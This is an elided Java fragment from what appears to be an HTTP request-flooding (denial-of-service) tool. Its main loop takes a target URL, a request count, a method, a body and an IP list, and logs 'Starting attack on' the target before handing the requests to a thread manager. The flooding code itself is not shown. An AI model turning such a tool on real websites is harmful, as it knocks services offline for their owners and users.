        ...
        try {
            ...
            while (true) {
                ...
                if (command.equals("0")) {
                    ...
                    int numRequests = inputHandler.getNumRequests();
                    ...
                    System.out.println(ConsoleColor.YELLOW + "[WARN]" + ConsoleColor.RESET + " Starting attack on " + targetUrl + " with " + numRequests + " requests...");
                    long startTime = System.currentTimeMillis();

                    ThreadManager.executeRequests(targetUrl, numRequests, method, body, ipList, sent, success, failed);

                    long endTime = System.currentTimeMillis();
                    System.out.println(ConsoleColor.GREEN + "[INFO]" + ConsoleColor.RESET + " Attack completed in " + (endTime - startTime) / 1000.0 + " seconds." + ConsoleColor.RESET);
